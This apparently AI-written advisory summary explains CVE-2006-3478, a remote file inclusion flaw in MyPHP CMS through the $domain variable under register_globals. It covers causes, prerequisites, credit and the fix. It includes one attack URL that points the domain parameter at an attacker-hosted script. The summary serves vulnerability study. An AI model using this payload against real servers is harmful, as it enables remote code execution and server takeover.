Based on the provided content, here's the breakdown of the vulnerability:

**CVE ID:** CVE-2006-3478

**Root cause of vulnerability:** The vulnerability is due to the lack of sanitization of the `$domain` variable in MyPHP CMS. When `register_globals` is enabled in PHP, an attacker can inject malicious PHP code through the `$domain` variable.

**Weaknesses/vulnerabilities present:**
- Remote File Inclusion (RFI) vulnerability.
- Lack of input sanitization of the `$domain` variable.
- Dependence on the deprecated PHP feature `register_globals`.

**Impact of exploitation:**
- An attacker can execute arbitrary PHP code on the server by including a malicious remote file. This can lead to complete compromise of the server.

**Attack vectors:**
- The attacker crafts a URL containing the vulnerable script (`global_header.php`) and sets the `domain` parameter to a malicious script URL:
```
http://www.site.com/[path]/styles/default/global_header.php?installed=23&domain=[Evil_Script]
```
- The `installed` parameter is required for the exploit to function correctly, which was added as a note.

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker needs to have access to a web server hosting the malicious script to be included.
- The `register_globals` PHP setting must be enabled on the server for the exploit to work.

**Additional Information:**
- The Exploit Database entry (EDB-ID: 1983) provides more details about the vulnerable software (MyPHP CMS <= 0.3) and a PoC exploit.
- The vulnerability is classified as "Dangerous" with a critical level impact.
- The exploit was verified by the EDB.
- The vulnerability was discovered and reported by Kw3[R]Ln from the Romanian Security Team.
- The recommended solution is to properly declare the `$domain` variable.
